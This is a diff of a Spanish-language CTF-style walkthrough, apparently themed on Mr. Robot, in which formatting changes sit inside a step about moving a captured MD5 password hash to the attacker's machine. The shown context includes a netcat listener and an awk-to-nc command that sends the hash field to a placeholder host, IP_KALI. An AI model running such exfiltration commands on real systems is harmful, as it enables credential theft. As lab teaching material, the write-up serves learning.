@@ -352,12 +352,12 @@ Lo primero que hacemos es ir a Internet y tratar de crackearlo usando alguna apl
 >[!note]
 >Para ello debemos de pasar el hash a nuestro sistema.
 >Esto puede ser tan simple como copiar y pegar el contenido, pero aquí hemos venido a aprender y hacer la cosas como las haría *Elliot*, por lo que:
->- Preparamos un puerto que pondremos a la escucha en nuestra máquina atacante:
+>- **Preparamos un puerto** que pondremos a la escucha en nuestra máquina atacante:
 >```bash
 >nc -nvlp 7777 > hash.txt
 ># Todo lo que resiba en la conexión lo guardará en el fichero hash.txt
 >```
->- Limpiamos el hash:
+>- **Limpiamos el hash**:
 >  El hash viene con el formato `usuario:hash`, pero a nosotros tan solo nos interesa en este momento el hash. Para solo pasar por la conexión el hash:
 >  ```bash
 >  awk -F: '{print $2}' password.raw-md5 | nc IP_KALI 7777
